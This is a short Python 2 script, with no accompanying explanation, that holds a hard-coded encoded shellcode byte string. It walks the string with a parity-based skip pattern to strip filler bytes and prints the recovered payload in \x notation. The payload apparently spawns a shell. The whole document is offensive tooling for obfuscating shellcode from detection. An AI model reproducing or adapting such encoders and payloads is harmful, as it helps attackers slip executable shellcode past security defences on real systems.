shellcode = "\x31\x5c\xc0\xd2\x35\x50\x3f\x68\x0a\x6e\x9b\xcd\x66\xfb\xf6\x69\xd7\x67\x19\x68\x31\x69\x26\x66\xff\x1d\x63\xcb\xda\x6f\xa7\x68\xf1\x62\x10\x69\xc0\x9d\x6e\x7f\x2f\x30\x68\x05\xa4\x2f\x1b\x2f\x13\x2f\x64\x73\x25\x59\x89\xdb\x77\xe3\xd8\x0e\x50\x14\xc8\x89\x3a\x36\xe2\x4f\x0a\x53\xc5\x89\x47\xe1\xc6\xb0\x95\x3c\x0b\x54\xcd\x97\x55\x80"
encoded = bytearray(shellcode)
encodedNew = r"\x" + hex(encoded[0])[2:]
ln = len(encoded) - 1

i = 1
currEven = False
while i < ln:
    currVal = encoded[i]

    if currEven:
        currVal += encoded[i - 1]

    currEven = True if currVal % 2 == 0 else False
    offset = 3 if currEven else 2 
    nextVal = encoded[i + 1]
    i += offset
    encodedNew += r"\x" + hex(nextVal)[2:]
print encodedNew